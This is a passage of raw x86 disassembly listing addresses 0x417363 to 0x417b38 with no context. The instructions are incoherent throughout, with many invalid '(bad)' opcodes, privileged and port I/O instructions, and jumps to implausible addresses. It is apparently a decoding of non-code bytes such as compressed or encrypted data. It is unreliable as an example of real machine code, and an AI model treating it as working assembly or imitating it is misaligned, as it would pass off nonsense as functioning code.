  417363:	btr    DWORD PTR [eax-0x66],edx
  417367:	es push cs
  417369:	pop    es
  41736a:	adc    eax,edx
  41736c:	int3   
  41736d:	mov    eax,ebx
  41736f:	jmp    DWORD PTR [esp+ebx*2+0x22]
  417373:	(bad)  
  417374:	outs   dx,BYTE PTR ds:[esi]
  417375:	ins    BYTE PTR es:[edi],dx
  417376:	or     edi,ebx
  417378:	sbb    eax,0x8eacf069
  41737d:	hlt    
  41737e:	mov    edi,0xd47e3c97
  417383:	call   0x95ab4111
  417388:	adc    eax,0x7fa76081
  41738d:	pusha  
  41738e:	xchg   ecx,eax
  41738f:	ss mov edi,0xdea04a83
  417395:	or     BYTE PTR [ebp+0x274fdc8],bl
  41739b:	and    esi,DWORD PTR [ebx-0x3b]
  41739e:	xchg   ebp,eax
  41739f:	push   esi
  4173a0:	xor    eax,0xf2b9694f
  4173a5:	and    eax,0x857398c5
  4173aa:	adc    dl,BYTE PTR [edx-0x7fc22972]
  4173b0:	cs rol esi,1
  4173b3:	or     al,0x7d
  4173b5:	push   ecx
  4173b6:	cmp    esp,DWORD PTR [edx+0xd]
  4173b9:	jecxz  0x4173fe
  4173bb:	cdq    
  4173bc:	ds pop edx
  4173be:	mov    eax,0x322e070
  4173c3:	mov    ebx,0x81caa790
  4173c8:	hlt    
  4173c9:	push   cs
  4173ca:	dec    ecx
  4173cb:	in     eax,0x8e
  4173cd:	fcomp  DWORD PTR [edx-0x225241eb]
  4173d3:	cmp    ebx,esp
  4173d5:	cld    
  4173d6:	adc    ebx,DWORD PTR [eax]
  4173d8:	cmp    ebx,DWORD PTR [edi]
  4173da:	or     eax,0x34d91765
  4173df:	(bad)  
  4173e0:	rcl    BYTE PTR [edx-0x62ce2522],cl
  4173e6:	ret    
  4173e7:	sahf   
  4173e8:	add    esp,esp
  4173ea:	and    ebp,DWORD PTR [esp+ebx*1]
  4173ed:	xor    eax,0xbf6324a8
  4173f2:	dec    edi
  4173f3:	stos   DWORD PTR es:[di],eax
  4173f5:	clc    
  4173f6:	out    dx,al
  4173f7:	mov    bh,BYTE PTR [ebx+0x4c]
  4173fa:	inc    ecx
  4173fb:	inc    esi
  4173fc:	or     eax,0xb4d44967
  417401:	lods   eax,DWORD PTR ds:[esi]
  417402:	cmp    esp,DWORD PTR [edi]
  417404:	jnp    0x4173c9
  417406:	leave  
  417407:	push   0x6ae12f4b
  41740c:	repnz stos BYTE PTR es:[edi],al
  41740e:	xchg   esp,eax
  41740f:	adc    BYTE PTR [esi-0x14],cl
  417412:	adc    BYTE PTR [edi+0x6f],cl
  417415:	mov    al,ds:0xd0ed8bd0
  41741a:	dec    edi
  41741b:	jb     0x4173f0
  41741d:	jmp    0xf71fad51
  417422:	fcomp  QWORD PTR [edi-0x54f51f94]
  417428:	xor    ah,BYTE PTR [edx-0x2396ebd]
  41742e:	or     DWORD PTR [edi+0x32],ebx
  417431:	stc    
  417432:	or     DWORD PTR [ecx-0x5b],ecx
  417435:	mov    ecx,0x7ae98ece
  41743a:	(bad)  [edx]
  41743c:	push   edx
  41743d:	xchg   ecx,eax
  41743e:	mov    al,0x86
  417440:	sbb    DWORD PTR [ecx],0x28
  417443:	pop    ebx
  417444:	add    ebp,eax
  417446:	jo     0x417480
  417448:	sbb    al,0xa4
  41744a:	xchg   esp,eax
  41744b:	mov    WORD PTR [ebp-0x7b],cs
  41744e:	mov    DWORD PTR ds:0xd04dd0d5,edx
  417454:	sbb    BYTE PTR ds:0x4d29b8cb,ah
  41745a:	cmp    ebx,DWORD PTR [edx+0x64453e29]
  417460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417461:	mov    edi,0xa9836300
  417466:	or     al,0x15
  417468:	mov    bl,0xaa
  41746a:	add    esi,DWORD PTR [esi-0x4698082a]
  417470:	fld    st(3)
  417472:	call   0x68beae9c
  417477:	pop    es
  417478:	pop    es
  417479:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41747b:	mov    edx,0x22cbb647
  417480:	(bad)  
  417481:	scas   al,BYTE PTR es:[edi]
  417482:	dec    ebp
  417483:	out    0xe,eax
  417485:	push   edx
  417486:	dec    edx
  417487:	xor    DWORD PTR [eax],0xffffffb3
  41748a:	sub    al,0x51
  41748c:	jg     0x41748c
  41748e:	or     ecx,edi
  417490:	push   ecx
  417491:	push   0xffffff95
  417493:	fsubr  QWORD PTR [ebx]
  417495:	push   ebp
  417496:	mov    DWORD PTR [eax+0x2527724],ecx
  41749c:	dec    ecx
  41749d:	popf   
  41749e:	adc    eax,ecx
  4174a0:	pop    es
  4174a1:	in     al,0x4e
  4174a3:	adc    al,0x6b
  4174a5:	rcl    al,0x87
  4174a8:	sub    ah,ch
  4174aa:	jmp    0xb7b4e86d
  4174af:	lea    edi,[edi-0x292ce77f]
  4174b5:	inc    esi
  4174b6:	scas   eax,DWORD PTR es:[edi]
  4174b7:	push   ecx
  4174b8:	dec    esi
  4174b9:	loop   0x417475
  4174bb:	dec    esi
  4174bc:	cmp    ebp,DWORD PTR [ecx+0x60023241]
  4174c2:	fdivrp st(7),st
  4174c4:	js     0x417481
  4174c6:	ja     0x4174d2
  4174c8:	mov    esp,DWORD PTR [edx-0x68680fa1]
  4174ce:	std    
  4174cf:	and    bh,BYTE PTR [edx+0x17aa27a]
  4174d5:	mov    ah,0x57
  4174d7:	mov    cl,0xd2
  4174d9:	pushf  
  4174da:	mul    DWORD PTR [edx]
  4174dc:	js     0x41751a
  4174de:	(bad)  
  4174df:	out    dx,eax
  4174e0:	std    
  4174e1:	sbb    DWORD PTR [eax+0x2d199b1b],0x39
  4174e8:	fmul   st(2),st
  4174ea:	sub    eax,DWORD PTR ss:[ebx]
  4174ed:	stos   BYTE PTR es:[edi],al
  4174ee:	xor    ebx,DWORD PTR [esi+0x27]
  4174f1:	loopne 0x4174fa
  4174f3:	in     eax,dx
  4174f4:	pop    es
  4174f5:	mov    esp,DWORD PTR [ebx]
  4174f7:	std    
  4174f8:	arpl   ax,sp
  4174fa:	sub    ah,BYTE PTR [ebp+0x42dcf58c]
  417500:	in     al,0xa0
  417502:	je     0x4174cb
  417504:	je     0x4174b9
  417506:	dec    esp
  417507:	jo     0x4174cd
  417509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41750a:	xchg   edi,eax
  41750b:	jg     0x41751b
  41750d:	pop    ebp
  41750e:	jg     0x417544
  417510:	jge    0x417591
  417512:	out    0xc8,eax
  417514:	dec    eax
  417515:	push   ebx
  417516:	sar    DWORD PTR [edi+0x7a24478e],cl
  41751c:	pop    ss
  41751d:	xchg   dh,cl
  41751f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417520:	xor    bh,BYTE PTR [ebx+0x24]
  417523:	stos   BYTE PTR es:[edi],al
  417524:	and    ebp,DWORD PTR [edi+0x6e6a1a23]
  41752a:	adc    esi,DWORD PTR ds:0x20aaaa69
  417530:	cli    
  417531:	jge    0x4174f1
  417533:	leave  
  417534:	into   
  417535:	lea    ebp,[eax]
  417537:	arpl   WORD PTR [edi-0x3392de47],di
  41753d:	mov    ah,0x66
  41753f:	cwde   
  417540:	sti    
  417541:	adc    bh,al
  417543:	xchg   ecx,eax
  417544:	push   edx
  417545:	es aas 
  417547:	test   DWORD PTR [eax+0x346f03a],ebx
  41754d:	sub    edi,ebp
  41754f:	fwait
  417550:	sbb    edi,0xffffffae
  417553:	vpavgb xmm1,xmm2,XMMWORD PTR [ebp+0x1d]
  417558:	repz mov WORD PTR [esi-0x3f],ds
  41755c:	and    DWORD PTR [eax+0x6a],0xa
  417560:	or     DWORD PTR [edx+0x35],eax
  417563:	mov    eax,0x1d1776ba
  417568:	imul   ecx,DWORD PTR [ebx-0x23392099],0xcdbf4b61
  417572:	xor    BYTE PTR [esi],al
  417574:	fstp   QWORD PTR [edx+0x10]
  417577:	and    DWORD PTR [esi-0x53a1c311],esi
  41757d:	pop    ebx
  41757e:	nop
  41757f:	add    DWORD PTR [ecx-0x6e],ecx
  417582:	loopne 0x417547
  417584:	ret    
  417585:	ds daa 
  417587:	dec    edi
  417588:	push   ebx
  417589:	jg     0x417528
  41758b:	shr    DWORD PTR [ecx-0x11984a5b],1
  417591:	mov    ebp,0xe8a568e5
  417596:	mov    eax,0x11ad1470
  41759b:	ss adc al,0x90
  41759e:	(bad)  
  41759f:	jecxz  0x417545
  4175a1:	dec    ebx
  4175a2:	adc    esp,DWORD PTR [edi]
  4175a4:	mov    esp,0xf78f9d67
  4175a9:	cmp    edx,esi
  4175ab:	push   0x33
  4175ad:	hlt    
  4175ae:	inc    esp
  4175af:	cmp    BYTE PTR [esi+0x6b],dl
  4175b2:	shl    ebp,1
  4175b4:	sbb    DWORD PTR [eax+ecx*1-0x7b],ebp
  4175b8:	ins    BYTE PTR es:[edi],dx
  4175b9:	mov    edi,0xe13dfa40
  4175be:	add    al,0xa2
  4175c0:	scas   al,BYTE PTR es:[edi]
  4175c1:	test   DWORD PTR [edi],esp
  4175c3:	stc    
  4175c4:	icebp  
  4175c5:	mov    eax,0xbe2aa0b7
  4175ca:	lds    edx,FWORD PTR ds:0x50649275
  4175d0:	xchg   ebp,eax
  4175d1:	fwait
  4175d2:	pop    esi
  4175d3:	jle    0x4175fc
  4175d5:	loope  0x417605
  4175d7:	jbe    0x41762c
  4175d9:	aam    0x0
  4175db:	inc    ecx
  4175dd:	pusha  
  4175de:	mov    esi,DWORD PTR [edi-0x64d54408]
  4175e4:	cmp    dh,BYTE PTR [ecx+0x35]
  4175e7:	push   cs
  4175e8:	aaa    
  4175e9:	xlat   BYTE PTR ds:[ebx]
  4175ea:	jp     0x417637
  4175ec:	mov    edi,0x29a540aa
  4175f1:	aad    0x86
  4175f3:	xchg   esi,eax
  4175f4:	rol    DWORD PTR [ebx+edx*8],0xb6
  4175f8:	das    
  4175f9:	push   ds
  4175fa:	loopne 0x417644
  4175fc:	and    eax,0x9959504f
  417601:	hlt    
  417602:	aas    
  417603:	(bad)  
  417604:	jnp    0x417665
  417606:	pop    eax
  417607:	into   
  417608:	hlt    
  417609:	repz rcl esi,cl
  41760c:	pop    ebx
  41760d:	pop    ss
  41760e:	leave  
  41760f:	in     al,0x3c
  417611:	leave  
  417612:	mov    eax,ds:0x265972bc
  417617:	sub    eax,0x8e1ede94
  41761c:	push   ebx
  41761d:	stc    
  41761e:	sbb    ecx,edi
  417620:	sar    DWORD PTR ds:[esi+0x77eed314],1
  417627:	adc    eax,0x51f5d0be
  41762c:	int    0xd5
  41762e:	fidiv  DWORD PTR [ebp+eiz*4-0x73]
  417632:	sub    DWORD PTR ds:0x78697352,edx
  417638:	test   esi,edx
  41763a:	and    BYTE PTR [ebp-0x7d],dl
  41763d:	fsubr  QWORD PTR [esi+0x38]
  417640:	icebp  
  417641:	mov    edi,0xb6201d56
  417646:	ss mov ebp,0x6d2fa4f0
  41764c:	mov    edi,0x5fef91b1
  417651:	sbb    bl,0x74
  417654:	pop    es
  417655:	jp     0x417620
  417657:	lods   al,BYTE PTR ds:[esi]
  417658:	dec    esi
  417659:	call   0xe728e200
  41765e:	fwait
  41765f:	push   edx
  417660:	xchg   ebx,eax
  417661:	push   0xd3a3925a
  417666:	xchg   ebx,eax
  417667:	mov    ecx,0x72742fbd
  41766c:	push   ecx
  41766d:	ins    DWORD PTR es:[edi],dx
  41766e:	je     0x41766a
  417670:	imul   ebp,DWORD PTR [edx],0x91714c60
  417676:	push   edx
  417677:	ret    0xe19d
  41767a:	cmp    eax,0x3085b1b5
  41767f:	cwde   
  417680:	add    DWORD PTR ds:0xef63fa0,0x7c
  417687:	sub    eax,0xe806c812
  41768c:	xor    esp,ebp
  41768e:	sbb    eax,0xaf228809
  417693:	cwde   
  417694:	or     DWORD PTR [eax-0xac76733],ecx
  41769a:	inc    edx
  41769b:	adc    esi,DWORD PTR [di]
  41769e:	mov    ds:0x45fff74a,al
  4176a3:	ss in  eax,0x99
  4176a6:	mov    al,ds:0x32755ba7
  4176ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176ac:	xor    al,0x7d
  4176ae:	xchg   ebp,ebp
  4176b0:	je     0x4176f6
  4176b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176b3:	ret    0xa15
  4176b6:	or     eax,0xe19b0bd4
  4176bb:	ins    BYTE PTR es:[edi],dx
  4176bc:	std    
  4176bd:	out    dx,eax
  4176be:	loope  0x4176e0
  4176c0:	xor    al,0x15
  4176c2:	push   eax
  4176c3:	add    al,0x52
  4176c5:	mov    edi,0x38195aa1
  4176ca:	sar    ebp,0xcd
  4176cd:	inc    ebp
  4176ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176cf:	add    bl,dh
  4176d1:	add    eax,0xce914acf
  4176d6:	sahf   
  4176d7:	(bad)  
  4176d8:	out    dx,al
  4176d9:	mov    DWORD PTR [ebx-0x3de73d15],eax
  4176df:	sbb    esi,DWORD PTR [edx+0x4a]
  4176e2:	pop    ebp
  4176e3:	pusha  
  4176e4:	fucomp st(3)
  4176e6:	ins    DWORD PTR es:[edi],dx
  4176e7:	jecxz  0x41767a
  4176e9:	pop    edi
  4176ea:	mov    al,ds:0xe96930e5
  4176ef:	call   0xfe4cb575
  4176f4:	inc    edi
  4176f5:	mov    bh,0x37
  4176f7:	xor    BYTE PTR [ecx],0xfd
  4176fa:	(bad)  
  4176fb:	data16 or al,0xc
  4176fe:	addr16 aad 0x17
  417701:	ret    
  417702:	push   cs
  417703:	call   0xd8af:0x2fa812d1
  41770a:	ss sahf 
  41770c:	enter  0xdc64,0xda
  417710:	outs   dx,DWORD PTR ds:[esi]
  417711:	jl     0x4176ad
  417713:	mov    edi,0xcfb60044
  417718:	dec    ebp
  417719:	jne    0x4176f7
  41771b:	pop    es
  41771c:	add    BYTE PTR [ebp-0x73],dh
  41771f:	sub    eax,0xe66d9ae5
  417724:	xor    DWORD PTR [edx],edi
  417726:	sti    
  417727:	dec    esp
  417728:	setns  BYTE PTR [ecx-0x275c8480]
  41772f:	out    0x55,al
  417731:	lods   al,BYTE PTR ds:[esi]
  417732:	outs   dx,BYTE PTR ds:[esi]
  417733:	sub    al,0xac
  417735:	adc    dh,dl
  417737:	repz jmp 0xd167723a
  41773d:	test   cl,0x12
  417740:	daa    
  417741:	cli    
  417742:	xchg   ecx,eax
  417743:	cmp    BYTE PTR [esi+0x20],ch
  417746:	inc    esi
  417747:	or     dh,dl
  417749:	imul   edx,DWORD PTR [esi+0x6c7904be],0xa16d64b8
  417753:	sar    DWORD PTR [esi-0x4c1a8832],1
  417759:	jnp    0x417761
  41775b:	sar    BYTE PTR [edx-0x4d],cl
  41775e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41775f:	or     eax,0x5b0c0bac
  417764:	rcl    ebp,0x94
  417767:	ja     0x4177e7
  417769:	add    al,ah
  41776b:	jne    0x4176f6
  41776d:	dec    ecx
  41776e:	and    al,BYTE PTR ds:0x286b8c73
  417774:	push   0xfffffff0
  417776:	in     eax,0xcf
  417778:	js     0x417704
  41777a:	leave  
  41777b:	mov    dl,0x9d
  41777d:	scas   eax,DWORD PTR es:[edi]
  41777e:	mov    dl,0x5c
  417780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417781:	into   
  417782:	xchg   ebp,eax
  417783:	sub    eax,0x2e36490a
  417788:	xlat   BYTE PTR ds:[ebx]
  417789:	retf   0xb8c0
  41778c:	and    edx,ebp
  41778e:	mov    ebp,0x356cc826
  417793:	mov    ch,0xd1
  417795:	push   esi
  417796:	jb     0x4177c8
  417798:	into   
  417799:	or     eax,0x2426abb
  41779e:	push   0x9146e4ea
  4177a3:	test   BYTE PTR ds:[edi+ebx*4],cl
  4177a7:	inc    edx
  4177a8:	push   esi
  4177a9:	fdiv   DWORD PTR [edi]
  4177ab:	std    
  4177ac:	icebp  
  4177ad:	mov    eax,0xae6caca
  4177b2:	jmp    0x5567:0xcb469ca4
  4177b9:	dec    edi
  4177ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177bb:	mov    dl,0x7c
  4177bd:	shr    DWORD PTR [edx+0x2d679f18],cl
  4177c3:	inc    BYTE PTR [esi+edi*2-0x7409e03d]
  4177ca:	iret   
  4177cb:	pop    ecx
  4177cc:	xchg   DWORD PTR [edx],esi
  4177ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177cf:	sub    edx,eax
  4177d1:	std    
  4177d2:	xchg   ebx,eax
  4177d3:	cmp    DWORD PTR [eax+0x4c],0xffffffb7
  4177d7:	push   0xae61aba6
  4177dc:	xchg   ebp,eax
  4177dd:	sbb    dl,BYTE PTR ds:0x994a9532
  4177e3:	out    dx,eax
  4177e4:	repnz pop ds
  4177e6:	loop   0x417790
  4177e8:	inc    edx
  4177e9:	xchg   ecx,eax
  4177ea:	popa   
  4177eb:	cmp    esi,DWORD PTR [ebx-0x60]
  4177ee:	es in  al,0x6f
  4177f1:	int    0xf9
  4177f3:	std    
  4177f4:	xchg   esp,eax
  4177f5:	add    DWORD PTR [ecx],ebx
  4177f7:	scas   eax,DWORD PTR es:[edi]
  4177f8:	scas   al,BYTE PTR es:[edi]
  4177f9:	in     eax,dx
  4177fa:	dec    edx
  4177fb:	mov    cs,ebp
  4177fd:	out    dx,al
  4177fe:	ins    BYTE PTR es:[edi],dx
  4177ff:	jl     0x41782c
  417801:	pop    edi
  417802:	or     DWORD PTR [ecx-0xbae492e],esp
  417808:	sbb    edx,DWORD PTR [ebx+0xaa1589]
  41780e:	mov    ecx,0xe5f98195
  417813:	or     al,0x87
  417815:	cwde   
  417816:	imul   ebx,DWORD PTR [ecx-0x4a],0x885994a3
  41781d:	retf   0xc0a1
  417820:	test   eax,0xd1c9d72
  417825:	int    0x3d
  417827:	sahf   
  417828:	(bad)  
  417829:	enter  0x2d54,0x43
  41782d:	or     BYTE PTR [edx-0x713f7f97],dl
  417833:	std    
  417834:	sub    ch,al
  417836:	xor    DWORD PTR [esi-0x41],0x8817cfca
  41783d:	dec    edx
  41783e:	ss int3 
  417840:	call   0xda3bb138
  417845:	or     eax,0x382e121a
  41784a:	jmp    0x800f8675
  41784f:	ins    DWORD PTR es:[edi],dx
  417850:	mov    dh,0x9
  417852:	pusha  
  417853:	repz (bad) 
  417855:	cmp    DWORD PTR [esi+0x15],esp
  417858:	jno    0x417850
  41785a:	(bad)  
  41785b:	mov    al,0xf9
  41785d:	repz dec edi
  41785f:	or     al,0xb5
  417861:	push   ebx
  417862:	scas   eax,DWORD PTR es:[edi]
  417863:	mov    ebx,0x1fd4b09
  417868:	jl     0x4178ae
  41786a:	mov    bh,0xc1
  41786c:	test   BYTE PTR [ecx+0x32fc50f9],0x1c
  417873:	in     eax,0xe7
  417875:	lds    eax,FWORD PTR [edx+eiz*2]
  417878:	lods   eax,DWORD PTR ds:[esi]
  417879:	dec    ebx
  41787a:	dec    edi
  41787b:	xor    edx,eax
  41787d:	jg     0x417859
  41787f:	aam    0xb8
  417881:	pusha  
  417882:	adc    DWORD PTR [edx+edi*1+0x110cc7d4],ebx
  417889:	out    dx,eax
  41788a:	push   0x9f35960f
  41788f:	push   esp
  417890:	pcmpgtb mm1,QWORD PTR [ebx-0x77]
  417894:	or     esi,esi
  417896:	cmpxchg DWORD PTR [esp+ebp*8+0x27],edx
  41789b:	mov    DWORD PTR [ecx-0x46225d16],edx
  4178a1:	jle    0x4178e8
  4178a3:	mov    ecx,0xe096cdf0
  4178a8:	test   eax,0x876a7182
  4178ad:	dec    eax
  4178ae:	xchg   ebx,eax
  4178af:	daa    
  4178b0:	or     DWORD PTR [eax-0x48e645a3],esi
  4178b6:	clc    
  4178b7:	adc    BYTE PTR [ecx-0x71],bl
  4178ba:	jns    0x41785a
  4178bc:	sbb    bl,BYTE PTR [ebp-0x5e]
  4178bf:	cmc    
  4178c0:	mov    al,ds:0x687f7ea8
  4178c5:	xor    DWORD PTR [edi],eax
  4178c7:	rcl    BYTE PTR [ebp+0x4c],cl
  4178ca:	push   0xffffffa8
  4178cc:	stos   DWORD PTR es:[edi],eax
  4178cd:	dec    dh
  4178cf:	mov    bh,BYTE PTR [esi]
  4178d1:	loope  0x4178fa
  4178d3:	adc    DWORD PTR ds:0x87938cb6,eax
  4178d9:	xor    eax,0xc9112aa8
  4178de:	rcl    edx,0x26
  4178e1:	xor    ah,BYTE PTR [ecx-0x22]
  4178e4:	dec    ebx
  4178e5:	js     0x4178dd
  4178e7:	outs   dx,DWORD PTR ds:[esi]
  4178e8:	and    ebp,ebx
  4178ea:	leave  
  4178eb:	xchg   ebx,eax
  4178ec:	loop   0x417926
  4178ee:	aam    0x19
  4178f0:	into   
  4178f1:	rcr    BYTE PTR [ebp+0x68],0x92
  4178f5:	adc    ah,BYTE PTR [esi]
  4178f7:	mov    dl,0xe3
  4178f9:	push   ecx
  4178fa:	jl     0x417937
  4178fc:	jo     0x417908
  4178fe:	inc    edx
  4178ff:	xor    esi,esp
  417901:	rol    DWORD PTR [ebx+0x4b034b5f],cl
  417907:	sub    eax,ebp
  417909:	mov    cs,WORD PTR [ebp-0x39]
  41790c:	rcl    ebx,1
  41790e:	or     eax,0x42f30390
  417913:	fmul   st,st(1)
  417915:	fisubr WORD PTR [esi]
  417917:	in     al,0x5c
  417919:	add    eax,0x2c875a32
  41791e:	add    eax,DWORD PTR [eax+0x17]
  417921:	call   0xeba6:0x40981eef
  417928:	cwde   
  417929:	rcr    edx,cl
  41792b:	cmovp  eax,ebx
  41792e:	cmp    DWORD PTR [esi-0x4fc847cf],eax
  417934:	lods   eax,DWORD PTR ds:[esi]
  417935:	dec    eax
  417936:	imul   BYTE PTR [eax]
  417938:	mov    al,ds:0x46e40617
  41793d:	out    0xbf,al
  41793f:	aaa    
  417940:	out    0xea,al
  417942:	push   edi
  417943:	or     cl,al
  417945:	pop    esp
  417946:	push   ds
  417947:	scas   eax,DWORD PTR es:[edi]
  417948:	out    0xe6,eax
  41794a:	pushf  
  41794b:	dec    ebp
  41794c:	add    BYTE PTR ds:0xe8d9966b,al
  417952:	lods   al,BYTE PTR ds:[esi]
  417953:	test   BYTE PTR [ebx+0x65734f49],ch
  417959:	retf   0x5054
  41795c:	je     0xd18a7235
  417962:	clc    
  417963:	xor    eax,0xad61bd4
  417968:	sub    BYTE PTR [ebx],dl
  41796a:	iret   
  41796b:	jmp    0x417989
  41796d:	lods   al,BYTE PTR ds:[esi]
  41796e:	push   ss
  41796f:	pop    ebx
  417970:	xchg   ebx,eax
  417971:	push   ebp
  417972:	jb     0x41797a
  417974:	in     eax,dx
  417975:	jne    0x417970
  417977:	aad    0x7d
  417979:	ror    BYTE PTR [ecx],0x2
  41797c:	mov    bh,0x32
  41797e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41797f:	popa   
  417980:	xchg   ebp,eax
  417981:	pop    esp
  417982:	cmp    ebp,DWORD PTR [eax-0x7d]
  417985:	clc    
  417986:	or     al,0xbc
  417988:	cwde   
  417989:	leave  
  41798a:	bound  edx,QWORD PTR [ecx-0x46a026c0]
  417990:	mov    esi,0x39b0de5e
  417995:	cmp    esi,DWORD PTR [esp+edx*2+0x12]
  417999:	ins    DWORD PTR es:[edi],dx
  41799a:	mov    bl,0xbb
  41799c:	das    
  41799d:	mov    dh,0xcc
  41799f:	push   eax
  4179a0:	gs dec ebx
  4179a2:	push   ecx
  4179a3:	fstp   DWORD PTR [edi+0x52]
  4179a6:	mov    ds:0xe951d233,al
  4179ab:	mov    eax,ds:0xf34ea6ee
  4179b0:	test   eax,0x141a5e8f
  4179b5:	and    BYTE PTR [ebp-0x49],bh
  4179b8:	imul   esp,DWORD PTR [ebp+0x9],0x14
  4179bc:	aam    0x98
  4179be:	jl     0x41795c
  4179c0:	sbb    al,0xf4
  4179c2:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179c4:	punpckhbw mm7,mm6
  4179c7:	dec    ecx
  4179c8:	mov    al,0x7b
  4179ca:	cmp    ah,BYTE PTR [edi-0x59]
  4179cd:	dec    edx
  4179ce:	xchg   ebx,esp
  4179d0:	leave  
  4179d1:	sub    DWORD PTR [ebx-0x5b],ebp
  4179d4:	xor    BYTE PTR [ebp-0x5e],cl
  4179d7:	lds    esi,FWORD PTR [ebx+edx*4]
  4179da:	xor    eax,0x50975650
  4179df:	fist   DWORD PTR [ebx+0x6019d978]
  4179e5:	cdq    
  4179e6:	inc    ebx
  4179e7:	lds    edi,FWORD PTR [esi+0x5e]
  4179ea:	out    dx,eax
  4179eb:	popf   
  4179ec:	pushf  
  4179ed:	mov    DWORD PTR [ebp-0x63],ecx
  4179f0:	lahf   
  4179f1:	pop    ss
  4179f2:	out    0x13,eax
  4179f4:	xlat   BYTE PTR ds:[ebx]
  4179f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179f6:	arpl   WORD PTR [ecx+0x5ce57531],bx
  4179fc:	and    cl,BYTE PTR ds:0x1b9399a6
  417a02:	mov    bh,0x50
  417a04:	xor    al,al
  417a06:	cs and al,0x32
  417a09:	retf   0xf95b
  417a0c:	dec    ecx
  417a0d:	push   ds
  417a0e:	mov    al,ds:0x17151026
  417a13:	adc    al,0x20
  417a15:	clc    
  417a16:	sbb    dl,ah
  417a18:	add    DWORD PTR [esi+0x1c],esi
  417a1b:	cmp    BYTE PTR [edx+0x7cc41982],ch
  417a21:	into   
  417a22:	or     DWORD PTR ss:[ebx+0x388e67bc],esp
  417a29:	mov    ds:0xdde270c1,eax
  417a2e:	ds cmp eax,0xb601bb89
  417a34:	add    BYTE PTR [ebp+ebx*8+0x20],cl
  417a38:	mov    edi,0x2793ebbf
  417a3d:	das    
  417a3e:	shr    esp,cl
  417a40:	push   ds
  417a41:	or     edi,ecx
  417a43:	jnp    0x417a7e
  417a45:	add    esi,DWORD PTR [edx-0x32]
  417a48:	ins    BYTE PTR es:[edi],dx
  417a49:	les    esp,FWORD PTR ss:[ebp+ebx*2+0x67]
  417a4e:	popa   
  417a4f:	or     al,0xd5
  417a51:	in     al,0x5f
  417a53:	in     eax,0x3e
  417a55:	inc    esi
  417a56:	hlt    
  417a57:	(bad)  [ecx]
  417a59:	outs   dx,BYTE PTR ds:[esi]
  417a5a:	dec    ebp
  417a5b:	push   esi
  417a5c:	fild   QWORD PTR [ecx-0x78059f08]
  417a62:	in     eax,0xa2
  417a64:	cmp    ah,ah
  417a66:	les    ebx,FWORD PTR [edi+edi*2]
  417a69:	xor    esi,DWORD PTR [edi]
  417a6b:	dec    ecx
  417a6c:	cmp    ah,BYTE PTR [ebx+0x3a3aa15e]
  417a72:	nop
  417a73:	xchg   esi,eax
  417a74:	addr16 pop ecx
  417a76:	and    esp,DWORD PTR [edx-0x2a9abfd4]
  417a7c:	inc    edx
  417a7d:	std    
  417a7e:	jle    0x417ae3
  417a80:	imul   edi,esp,0x38dba293
  417a86:	cli    
  417a87:	les    esp,FWORD PTR [ebx+eiz*1]
  417a8a:	jge    0x417a0f
  417a8c:	cli    
  417a8d:	(bad)  
  417a8e:	xor    eax,0xdd108a52
  417a93:	hlt    
  417a94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a95:	stos   BYTE PTR es:[edi],al
  417a96:	gs inc ebp
  417a98:	xchg   edi,eax
  417a99:	push   0xa07fe37e
  417a9e:	scas   al,BYTE PTR es:[edi]
  417a9f:	or     DWORD PTR [ebp-0x30b72cae],eax
  417aa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aa6:	fucompp 
  417aa8:	(bad)  
  417aa9:	inc    WORD PTR [edi+0x45ead042]
  417ab0:	or     al,0x9b
  417ab2:	mov    dl,0x84
  417ab4:	enter  0x51a5,0x1e
  417ab8:	xchg   DWORD PTR [ebp+esi*2-0x44],edx
  417abc:	ins    DWORD PTR es:[edi],dx
  417abd:	xor    BYTE PTR [edi+edx*1+0xb],al
  417ac1:	add    eax,0xeb14dc66
  417ac6:	mov    WORD PTR [edx],ds
  417ac8:	inc    esi
  417ac9:	and    al,0xf3
  417acb:	mov    ah,BYTE PTR [ecx]
  417acd:	inc    ecx
  417ace:	inc    edi
  417acf:	dec    edx
  417ad0:	jb     0x417ab6
  417ad2:	and    BYTE PTR [eax-0x78],dl
  417ad5:	add    edx,DWORD PTR [edi-0xc]
  417ad8:	cmp    BYTE PTR [ecx-0xc860f06],ch
  417ade:	mov    eax,0x8700d394
  417ae3:	pop    esi
  417ae4:	outs   dx,DWORD PTR ds:[esi]
  417ae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ae6:	daa    
  417ae7:	and    BYTE PTR [ebx+0x3d1dc27f],ah
  417aed:	es pop ebx
  417aef:	fwait
  417af0:	xchg   esi,eax
  417af1:	pushf  
  417af2:	pop    ecx
  417af3:	or     al,0xad
  417af5:	lahf   
  417af6:	sbb    eax,0xd38e33e9
  417afb:	popa   
  417afc:	int3   
  417afd:	ficomp WORD PTR [ecx-0x5f033c3]
  417b03:	jb     0x417b62
  417b05:	scas   eax,DWORD PTR es:[edi]
  417b06:	aaa    
  417b07:	push   ds
  417b08:	dec    edi
  417b09:	mov    eax,ds:0x381ddcfa
  417b0e:	and    ah,BYTE PTR [ebp+0x3b]
  417b11:	dec    ebp
  417b12:	mov    ds:0x7c1a145a,eax
  417b17:	adc    al,0x22
  417b19:	mov    cl,BYTE PTR [edi+0x6ed28018]
  417b1f:	mov    dl,0xa8
  417b21:	push   0x5afd20a9
  417b26:	aaa    
  417b27:	sbb    DWORD PTR [esi+0x823c47e],ebx
  417b2d:	and    DWORD PTR cs:[ebx-0x4a01f111],0xe28d0eda
  417b38:	shl    DWORD PTR [ebx-0x57],1
